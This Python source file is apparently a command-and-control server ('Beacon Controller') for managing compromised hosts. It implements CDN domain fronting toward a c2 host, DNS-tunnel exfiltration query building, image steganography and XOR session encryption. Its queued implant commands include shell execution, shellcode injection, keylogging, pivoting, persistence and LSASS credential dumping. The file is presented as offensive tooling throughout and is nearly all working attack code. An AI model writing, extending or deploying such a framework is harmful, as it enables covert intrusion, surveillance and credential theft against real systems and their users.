#!/usr/bin/env python3
"""
BEACON CONTROLLER - C2 Framework
Command and control with domain fronting, DNS tunneling, steganography
"""

import base64
import hashlib
import json
import os
import struct
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Dict, List, Optional, Callable


class TransportType(Enum):
    HTTPS_FRONTING = "https_fronting"
    DNS_TUNNEL = "dns_tunnel"
    ICMP_TUNNEL = "icmp_tunnel"
    STEGANOGRAPHY = "steganography"
    WEBSOCKET = "websocket"
    LEGITIMATE_CLOUD = "cloud_api"


class BeaconState(Enum):
    DORMANT = "dormant"
    ACTIVE = "active"
    EXFILTRATING = "exfiltrating"
    DEAD = "dead"


@dataclass
class Beacon:
    id: str
    hostname: str
    ip: str
    user: str
    os: str
    arch: str
    pid: int
    first_seen: datetime
    last_seen: datetime
    state: BeaconState
    transport: TransportType
    jitter: float
    sleep_time: int
    encryption_key: bytes
    tasks: List[Dict] = field(default_factory=list)
    results: List[Dict] = field(default_factory=list)


class DomainFronting:
    """CDN domain fronting for covert HTTPS communications"""
    
    FRONTING_CONFIGS = {
        "cloudflare": {
            "front_domain": "cdn.cloudflare.com",
            "real_host": "c2.target.com",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "azure": {
            "front_domain": "ajax.aspnetcdn.com",
            "real_host": "c2.target.com",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        },
        "fastly": {
            "front_domain": "global.fastly.net",
            "real_host": "c2.target.com",
            "user_agent": "Mozilla/5.0"
        }
    }
    
    def __init__(self, provider: str = "cloudflare", real_host: str = None):
        self.config = self.FRONTING_CONFIGS.get(provider, self.FRONTING_CONFIGS["cloudflare"]).copy()
        if real_host:
            self.config["real_host"] = real_host
    
    def build_request(self, data: bytes, endpoint: str = "/api/v1/check") -> Dict:
        return {
            "method": "POST",
            "url": f"https://{self.config['front_domain']}{endpoint}",
            "headers": {
                "Host": self.config["real_host"],
                "User-Agent": self.config["user_agent"],
                "Content-Type": "application/octet-stream",
                "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
            },
            "data": data,
            "verify": True
        }


class DNSTunnel:
    """DNS tunneling for firewall bypass"""
    
    def __init__(self, domain: str, nameserver: str = None):
        self.domain = domain
        self.nameserver = nameserver
        self.chunk_size = 63
    
    def encode_data(self, data: bytes) -> List[str]:
        encoded = base64.b32encode(data).decode().lower().rstrip('=')
        return [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
    
    def build_exfil_queries(self, data: bytes, beacon_id: str) -> List[str]:
        chunks = self.encode_data(data)
        return [f"{i:04d}.{chunk}.{beacon_id}.{self.domain}" for i, chunk in enumerate(chunks)]
    
    def build_command_query(self, beacon_id: str) -> str:
        return f"cmd.{beacon_id}.{self.domain}"


class SteganographyChannel:
    """Hide C2 traffic in images"""
    
    def __init__(self, platform: str = "imgur"):
        self.platform = platform
    
    def encode_in_image(self, image_data: bytes, payload: bytes) -> bytes:
        """LSB steganography"""
        payload_bits = ''.join(format(b, '08b') for b in payload)
        payload_bits = format(len(payload), '032b') + payload_bits
        
        img_array = bytearray(image_data)
        for i, bit in enumerate(payload_bits):
            if i >= len(img_array):
                break
            img_array[i] = (img_array[i] & 0xFE) | int(bit)
        
        return bytes(img_array)
    
    def decode_from_image(self, image_data: bytes) -> bytes:
        img_array = bytearray(image_data)
        length_bits = ''.join(str(b & 1) for b in img_array[:32])
        payload_length = int(length_bits, 2)
        payload_bits = ''.join(str(b & 1) for b in img_array[32:32 + payload_length * 8])
        return bytes(int(payload_bits[i:i+8], 2) for i in range(0, len(payload_bits), 8))


class BeaconEncryption:
    """Multi-layer encryption for beacon communications"""
    
    def __init__(self, master_key: bytes):
        self.master_key = master_key
    
    def derive_session_key(self, beacon_id: str, timestamp: int) -> bytes:
        """Derive unique session key"""
        material = self.master_key + beacon_id.encode() + struct.pack('>Q', timestamp)
        return hashlib.sha256(material).digest()
    
    def encrypt(self, plaintext: bytes, beacon_id: str) -> bytes:
        """XOR encryption with session key (simplified)"""
        timestamp = int(time.time())
        session_key = self.derive_session_key(beacon_id, timestamp)
        
        encrypted = bytes(p ^ session_key[i % len(session_key)] for i, p in enumerate(plaintext))
        return struct.pack('>Q', timestamp) + encrypted
    
    def decrypt(self, data: bytes, beacon_id: str) -> bytes:
        timestamp = struct.unpack('>Q', data[:8])[0]
        ciphertext = data[8:]
        session_key = self.derive_session_key(beacon_id, timestamp)
        return bytes(c ^ session_key[i % len(session_key)] for i, c in enumerate(ciphertext))


class BeaconController:
    """Main C2 controller"""
    
    def __init__(self, master_key: bytes):
        self.beacons: Dict[str, Beacon] = {}
        self.encryption = BeaconEncryption(master_key)
        self.transports = {
            TransportType.HTTPS_FRONTING: DomainFronting(),
            TransportType.DNS_TUNNEL: DNSTunnel("c2.example.com"),
            TransportType.STEGANOGRAPHY: SteganographyChannel()
        }
        self.command_queue: Dict[str, List[Dict]] = {}
        self.result_handlers: Dict[str, Callable] = {}
    
    def register_beacon(self, checkin_data: Dict) -> Beacon:
        beacon_id = hashlib.sha256(
            f"{checkin_data['hostname']}{checkin_data['ip']}{time.time()}".encode()
        ).hexdigest()[:16]
        
        beacon = Beacon(
            id=beacon_id,
            hostname=checkin_data["hostname"],
            ip=checkin_data["ip"],
            user=checkin_data["user"],
            os=checkin_data["os"],
            arch=checkin_data["arch"],
            pid=checkin_data["pid"],
            first_seen=datetime.utcnow(),
            last_seen=datetime.utcnow(),
            state=BeaconState.ACTIVE,
            transport=TransportType(checkin_data.get("transport", "https_fronting")),
            jitter=checkin_data.get("jitter", 0.2),
            sleep_time=checkin_data.get("sleep", 60),
            encryption_key=os.urandom(32)
        )
        
        self.beacons[beacon_id] = beacon
        self.command_queue[beacon_id] = []
        return beacon
    
    def queue_command(self, beacon_id: str, command: Dict):
        command["id"] = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        command["queued_at"] = datetime.utcnow().isoformat()
        self.command_queue[beacon_id].append(command)
    
    def process_checkin(self, beacon_id: str, encrypted_data: bytes) -> bytes:
        if beacon_id not in self.beacons:
            return b""
        
        beacon = self.beacons[beacon_id]
        beacon.last_seen = datetime.utcnow()
        
        if encrypted_data:
            data = self.encryption.decrypt(encrypted_data, beacon_id)
            results = json.loads(data)
            beacon.results.extend(results)
        
        commands = self.command_queue[beacon_id]
        self.command_queue[beacon_id] = []
        
        response = json.dumps(commands).encode()
        return self.encryption.encrypt(response, beacon_id)
    
    # Command generators
    def cmd_shell(self, beacon_id: str, command: str):
        self.queue_command(beacon_id, {"type": "shell", "command": command})
    
    def cmd_download(self, beacon_id: str, remote_path: str):
        self.queue_command(beacon_id, {"type": "download", "path": remote_path})
    
    def cmd_upload(self, beacon_id: str, local_data: bytes, remote_path: str):
        self.queue_command(beacon_id, {
            "type": "upload",
            "path": remote_path,
            "data": base64.b64encode(local_data).decode()
        })
    
    def cmd_inject(self, beacon_id: str, shellcode: bytes, target_pid: int):
        self.queue_command(beacon_id, {
            "type": "inject",
            "pid": target_pid,
            "shellcode": base64.b64encode(shellcode).decode()
        })
    
    def cmd_screenshot(self, beacon_id: str):
        self.queue_command(beacon_id, {"type": "screenshot"})
    
    def cmd_keylog_start(self, beacon_id: str):
        self.queue_command(beacon_id, {"type": "keylog", "action": "start"})
    
    def cmd_pivot(self, beacon_id: str, target_ip: str, target_port: int):
        self.queue_command(beacon_id, {
            "type": "pivot",
            "target_ip": target_ip,
            "target_port": target_port
        })
    
    def cmd_persist(self, beacon_id: str, method: str):
        self.queue_command(beacon_id, {"type": "persist", "method": method})
    
    def cmd_creds_dump(self, beacon_id: str, method: str = "lsass"):
        self.queue_command(beacon_id, {"type": "creds", "method": method})
    
    def cmd_sleep(self, beacon_id: str, seconds: int, jitter: float = 0.2):
        self.queue_command(beacon_id, {"type": "sleep", "seconds": seconds, "jitter": jitter})
    
    def cmd_exit(self, beacon_id: str):
        self.queue_command(beacon_id, {"type": "exit"})
        self.beacons[beacon_id].state = BeaconState.DEAD


if __name__ == "__main__":
    master_key = os.urandom(32)
    controller = BeaconController(master_key)
    print("[*] Beacon Controller initialized")
